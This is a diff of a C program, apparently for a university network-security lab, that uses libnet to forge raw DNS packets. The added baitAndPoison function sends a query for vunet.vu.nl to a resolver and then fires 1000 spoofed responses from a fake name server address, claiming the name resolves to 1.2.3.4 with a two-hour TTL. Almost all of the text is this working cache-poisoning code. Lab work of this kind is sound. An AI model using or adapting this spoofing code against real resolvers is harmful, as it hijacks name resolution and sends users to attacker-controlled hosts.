@@ -3,143 +3,14 @@
 #include <unistd.h>
 #include <getopt.h>
 #include <stdint.h>
-#include <libnet.h>
-
-#define DNS_NAME_LENGTH 64
-#define RECORD_BUFFER_SIZE 1024
-#define NULL_PAYLOAD NULL
-#define NULL_PAYLOAD_SIZE 0
-typedef unsigned char uchar_t;
-
-struct Libnet {
-	libnet_t* context;
-	char* errorBuffer;
-};
-
-struct NetworkOrderedIPs {
-	uint32_t source;
-	uint32_t destination;
-};
-
-struct IPv4HeaderOptions {
-	struct Libnet libnet;
-	uint16_t resourceLength;
-	uint32_t sourceIP;
-	uint32_t destinationIP;
-};
-
-struct UDPHeaderOptions {
-	struct Libnet libnet;
-	uint16_t resourceLength;
-	uint16_t sourcePort;
-	uint16_t destinationPort;
-};
-
-struct DNSHeaderOptions {
-	struct Libnet libnet;
-	u_int16_t resourceLength;
-	uint16_t queryID;
-	uint16_t flags;
-	uint16_t numberQuestions;
-	uint16_t numberAnswerResourceRecords;
-	uint16_t authorityResourceRecord;
-};
-
-struct DNSQuestionFormatOptions {
-	char* qname;
-	uint16_t qtype;
-	uint16_t qclass;
-};
-
-struct DNSQuestionRecordOptions {
-	struct Libnet libnet;
-	struct DNSQuestionFormatOptions formatOptions;
-};
-
-struct DNSQuestionRecord {
-	libnet_ptag_t libnet_ptag;
-	uint16_t questionSize;
-};
-
-struct DNSRequestHeaders {
-	libnet_ptag_t DNSHeaderPtag;
-	libnet_ptag_t UDPHeaderPtag;
-	libnet_ptag_t IPv4HeaderPtag;
-};
-
-struct DNSBaseRequestOptions {
-	struct NetworkOrderedIPs networkOrderedIPs;
-	uint16_t sourcePort;
-	uint16_t destinationPort;
-	uint16_t queryID;
-};
-
-struct DNSRequestHeadersOptions {
-	struct Libnet libnet;
-	struct DNSBaseRequestOptions base;
-	struct DNSHeaderOptions dnsHeaderOptions;
-	uint16_t recordsSize;
-};
-
-struct DNSBaseRequest {
-	struct Libnet libnet;
-	struct DNSRequestHeaders headers;
-};
-
-struct DNSQueryRequest {
-	struct DNSQuestionRecord DNSQuestionRecord;
-	struct DNSBaseRequest base;
-};
 
 
-struct DNSRequestOptions {
-	char* qname;
-	char* sourceIP;
-	char* destinationIP;
-	struct DNSBaseRequestOptions base;
-};
-
-struct DNSAnswerRecord {
-	uint16_t recordSize;
-	libnet_ptag_t ptag;
-};
-
-struct DNSAnswerRequest {
-	struct DNSAnswerRecord answerRecord;
-	struct DNSQueryRequest queryRequest;
-
-};
-
-struct DNSAnswerRecordOptions {
-	libnet_ptag_t ptag;
-	char* qname;
-	uint16_t type;
-	uint16_t class;
-	uint32_t ttl;
-	uint16_t rdlength;
-	char* rdata;
-};
-
-struct DNSAnswerRecordFormatOptions {
-	struct Libnet libnet;
-	uchar_t* buffer;
-	struct DNSAnswerRecordOptions answer;
-};
+#include "attack.h"
 
 void 						destroyLibnetContext(struct Libnet libnet);
-void 						parseArguments(int part, int argc, char* argv[]);
-void 						uint16ToChars(uchar_t* buffer, uint16_t uint);
-void 						uint32ToChars(uchar_t* buffer, uint32_t uint32);
-char 						uint32toOctateChar(uint32_t uint32);
-char 						uint8toOctateChar(uint8_t uint8);
-uint16_t 					makeDomain(char* buffer, char* domainString);
-short 						parseOptions(int argc, char* argv[]);
 uint16_t 					formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options);
 uint16_t 					formatDNSAnswer(struct DNSAnswerRecordFormatOptions options);
-uint16_t					makeDomain(char* buffer, char* domainString);
-uint16_t 					uint16tono16(uint16_t uint);
 uint32_t 					makeByteNumberedIP(struct Libnet libnet, char* name, int resolve);
-uint32_t 					uint32tono32(uint32_t uint32);
 struct Libnet 				makeLibnet();
 libnet_ptag_t 				makeIPHeader(struct IPv4HeaderOptions options);
 libnet_ptag_t 				makeUDPHeader(struct UDPHeaderOptions options);
@@ -148,64 +19,55 @@ struct DNSRequestHeaders	makeDNSRequestHeaders(struct DNSRequestHeadersOptions o
 struct DNSQueryRequest 		makeDNSQueryRequest(struct DNSRequestOptions options);
 struct DNSQuestionRecord 	makeDNSQuestionRecord(struct DNSQuestionRecordOptions options);
 struct DNSAnswerRecord 		makeDNSAnswerRecord(struct DNSAnswerRecordOptions options);
-struct NetworkOrderedIPs 	parseIPs(struct Libnet libnet, char* sourceIPString, char* destinationIPString);
+struct DNSAnswerRequest 	makeDNSAnswerRequest(struct DNSRequestOptions options);
 
 void partOne(int argc, char* argv[]) {
 
 }
 
-void baitResolver(struct DNSRequestOptions options) {
+void baitAndPoison(struct DNSRequestOptions options) {
 	struct DNSQueryRequest QNameQuery = makeDNSQueryRequest(options);
+	options.sourceIP = "192.168.10.30";
+	options.base.destinationPort = 12000;
+	options.base.sourcePort = 53;
+	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(options);
 	libnet_write(QNameQuery.base.libnet.context);
+	for(int i  = 0; i < 1000; i++){
+		libnet_write(answerRequest.queryRequest.base.libnet.context);
+	}
 	destroyLibnetContext(QNameQuery.base.libnet);
 }
-
-void poisonCache(struct DNSRequestOptions options) {
-	struct DNSAnswerRequest request;
-	// request.answerRecord = makeDNSAnswerRecord()
-
-}
-
-char uint8toOctateChar(uint8_t uint8) {
-	return (char)(uint8 & 0xFF);
-}
-char uint32toOctateChar(uint32_t uint32) {
-	return (char)(uint32 & 0xFF);
-}
-
 
 int main(int argc, char* argv[]) {
 
 	short part = parseOptions(argc, argv);
 	struct DNSBaseRequestOptions baseRequestOptions;
 	baseRequestOptions.queryID = 1000;
-	baseRequestOptions.sourcePort = 53;
+	baseRequestOptions.sourcePort = 17012;
 	baseRequestOptions.destinationPort = 53;
-
 	struct DNSRequestOptions bait;
 	bait.qname = "vunet.vu.nl";
 	bait.sourceIP = "192.168.10.20";
 	bait.destinationIP = "192.168.10.10";
 	bait.base = baseRequestOptions;
-	baitResolver(bait);
+	baitAndPoison(bait);
 	return 0;
 }
 
 struct DNSAnswerRecord makeDNSAnswerRecord(struct DNSAnswerRecordOptions options) {
 
-	struct Libnet libnet;
 	struct DNSAnswerRecord record;
 	char answerBuffer[RECORD_BUFFER_SIZE] = { '\0' };
-	struct DNSAnswerRecordFormatOptions answerFormatOptions = { libnet, answerBuffer, options };
+	struct DNSAnswerRecordFormatOptions answerFormatOptions = { options.libnet, answerBuffer, options };
 	record.recordSize = formatDNSAnswer(answerFormatOptions);
 	record.ptag = libnet_build_data(
 		(uint8_t*)answerBuffer,
-		record.recordSize,
-		libnet.context,
+		(uint32_t)record.recordSize,
+		options.libnet.context,
 		options.ptag
 	);
 	if (record.ptag == -1) {
-		fprintf(stderr, "Error: Could not create Answer Record.\n Libnet error: %s", libnet_geterror(libnet.context));
+		fprintf(stderr, "Error: Could not create Answer Record.\n Libnet error: %s", libnet_geterror(options.libnet.context));
 		exit(EXIT_FAILURE);
 	}
 	return record;
@@ -298,31 +160,40 @@ struct NetworkOrderedIPs parseIPs(struct Libnet libnet, char* sourceIPString, ch
 
 struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){
 
-	struct DNSQueryRequest query;
-	query.base.libnet = makeLibnet();
-	uint16_t qtype = 1, qclass = 1;
-	options.base.networkOrderedIPs = parseIPs(query.base.libnet, options.sourceIP, options.destinationIP);
-
 	struct DNSAnswerRequest answerRequest;
 	struct DNSQueryRequest queryRequest;
+	queryRequest.base.libnet = makeLibnet();
+	uint16_t qtype = 1, qclass = 1;
+	options.base.networkOrderedIPs = parseIPs(queryRequest.base.libnet, options.sourceIP, options.destinationIP);
 
-	struct DNSAnswerRecord = makeDNSAnswerRecord()
+
+	struct DNSAnswerRecordOptions answerRecordOptions;
+	answerRecordOptions.qname = options.qname;
+	answerRecordOptions.type = 1;
+	answerRecordOptions.class = 1;
+	answerRecordOptions.ttl = 7200;
+	answerRecordOptions.rdlength = 4;
+	answerRecordOptions.rdata = "1.2.3.4";
+	answerRecordOptions.ptag = 0;
+	answerRecordOptions.libnet = queryRequest.base.libnet;
+	struct DNSAnswerRecord answerRecord = makeDNSAnswerRecord(answerRecordOptions);
 
 	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
-	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { query.base.libnet, DNSQuestionFormatOptions };
-	query.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);
+	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { queryRequest.base.libnet, DNSQuestionFormatOptions };
+	queryRequest.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);
 
 	struct DNSRequestHeadersOptions requestHeadersOptions;
-	struct DNSHeaderOptions dnsHeaderOptions = { query.base.libnet, query.DNSQuestionRecord.questionSize, options.base.queryID , 0x0100, 1, 0, 0};
+	struct DNSHeaderOptions dnsHeaderOptions = { queryRequest.base.libnet, queryRequest.DNSQuestionRecord.questionSize, options.base.queryID , 0b1000010000000000, 1, 1, 0};
 
-	requestHeadersOptions.libnet = query.base.libnet;
+	requestHeadersOptions.libnet = queryRequest.base.libnet;
 	requestHeadersOptions.base = options.base;
-	requestHeadersOptions.recordsSize = query.DNSQuestionRecord.questionSize;
+	requestHeadersOptions.recordsSize = queryRequest.DNSQuestionRecord.questionSize + answerRecord.recordSize;
 	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;
 
-	query.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
-	return query;
-	// struct DNSQueryRequest = 
+	queryRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
+	answerRequest.answerRecord = answerRecord;
+	answerRequest.queryRequest = queryRequest;
+	return answerRequest;
 }
 
 struct DNSQueryRequest makeDNSQueryRequest(struct DNSRequestOptions options) {
@@ -474,102 +345,5 @@ void destroyLibnetContext(struct Libnet libnet) {
 	libnet_destroy(libnet.context);
 	free(libnet.errorBuffer);
 	return;
-}
-
-short parseOptions(int argc, char* argv[]) {
-	char opt = '\0';
-	short part = 0;
-	while ((opt = getopt(argc, argv, "p:")) != EOF) {
-		switch (opt)
-		{
-		case 'p':;
-			char* tailptr;
-			const int base = 0;
-			part = (int)strtol(optarg, &tailptr, base);
-			if (strcmp(tailptr, "") != 0) {
-				fprintf(stderr, "Error parsing -p argument. %s is invalid.\n", optarg);
-				exit(EXIT_FAILURE);
-			}
-			if (part < 1 || part > 4) {
-				fprintf(stderr, "Error parsing -p argument. -p must be in range from 1-4.\n");
-				exit(EXIT_FAILURE);
-			}
-			break;
-		case '?':
-			if (optopt == 'p') {
-				fprintf(stderr, "Error parsing -%c argument. -%c must not be empty string.\n", optopt, optopt);
-			}
-			else if (isprint(optopt)) {
-				fprintf(stderr, "Unknown option -%c.\n", optopt);
-			}
-			exit(EXIT_FAILURE);
-		default:
-			abort();
-		}
-	}
-	return part;
-}
-
-uint16_t makeDomain(char* buffer, char* domainString) {
-	char* iter = domainString, * labelStart = domainString;
-	char* bufferIter = buffer;
-	uint32_t labelLength = 0, domainLength = 0;
-	while (1) {
-		if (*iter == '.' || *iter == '\0') {
-			char labelLengthAsChar = uint32toOctateChar(labelLength);
-			memcpy(bufferIter, &labelLengthAsChar, 1);
-			bufferIter += 1;
-
-			memcpy(bufferIter, labelStart, labelLength);
-			bufferIter += labelLength;
-			labelStart = iter + sizeof((char)'.');
-
-			domainLength += labelLength + sizeof labelLengthAsChar;
-			labelLength = 0;
-			if (*iter == '\0') {
-				char nullChar = 0x00;
-				memcpy(bufferIter, &nullChar, sizeof((char)'\0'));
-				domainLength += sizeof((char)'\0');
-				break;
-			}
-		}
-		else {
-			labelLength += 1;
-		}
-		iter += 1;
-	}
-	return domainLength;
-};
-
-uint16_t uint16tono16(uint16_t uint) {
-	uint16_t networkOrderedUint32 = 0;
-	uint8_t* networkOrderedIter = (uint8_t*)&networkOrderedUint32;
-	uint8_t* uintIter = (uint8_t*)&uint;
-	for (int i = sizeof(uint16_t) - 1, j = 0; i >= 0; i--) {
-		networkOrderedIter[j] = uintIter[i];
-		j++;
-	}
-	return networkOrderedUint32;
-};
-
-void uint16ToChars(uchar_t* buffer, uint16_t uint) {
-	uchar_t bytes = sizeof(uint16_t);
-	memcpy(buffer, (uchar_t*)&uint, bytes);
-}
-
-uint32_t uint32tono32(uint32_t uint32) {
-	uint32_t networkOrderedUint32 = 0;
-	uint8_t* networkOrderedIter = (uint8_t*)&networkOrderedUint32;
-	uint8_t* uint32Iter = (uint8_t*)&uint32;
-	for (int i = sizeof(uint32_t) - 1, j = 0; i >= 0; i--) {
-		networkOrderedIter[j] = uint32Iter[i];
-		j++;
-	}
-	return networkOrderedUint32;
-};
-
-void uint32ToChars(uchar_t* buffer, uint32_t uint32) {
-	uchar_t bytes = sizeof(uint32_t);
-	memcpy(buffer, (uchar_t*)&uint32, bytes);
 }
 
